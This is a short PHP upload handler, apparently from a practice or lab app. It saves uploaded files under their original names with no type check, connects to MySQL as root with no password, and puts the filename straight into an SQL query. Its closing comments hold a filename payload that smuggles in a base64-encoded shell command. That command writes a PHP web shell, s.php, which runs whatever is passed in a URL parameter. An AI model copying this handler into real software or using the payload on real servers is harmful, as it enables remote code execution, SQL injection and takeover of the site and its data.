<?php
if (!isset($_SESSION)) {
    session_start();
}
header('Content-Type: text/html; charset=utf-8');
// Kết nối cơ sở dữ liệu
$conn = mysqli_connect('localhost', 'root', '', 'command') or die('Connection fail!');
mysqli_set_charset($conn, "utf8");

//Upload file
if (isset($_POST['upload'])) {

    // lay thong tin file upload
    $filename = $_FILES['file']['name'];

    $destination = './uploads/' . $filename;

    $extension = pathinfo($filename, PATHINFO_EXTENSION);

    $file = $_FILES['file']['tmp_name'];

    if (move_uploaded_file($file, $destination)) {
        $sql = "INSERT INTO file (filename) VALUES ('$filename')";

        if (mysqli_query($conn, $sql)) {
            echo $destination . ' file Successfully!';
        } else {
            echo "Upload file Fail!";
            echo '<script>window.location="index.php";</script>';
            die();
        }
    }
}



// asd.png&$(echo $(echo ZWNobyAiPHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoXCRfR0VUWydlJ10uJyAyPiYxJyk7Pz48L3ByZT4iPnMucGhw |base64 -decode) | bash)&

// ZWNobyAiPHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoXCRfR0VUWydlJ10uJyAyPiYxJyk7Pz48L3ByZT4iPnMucGhw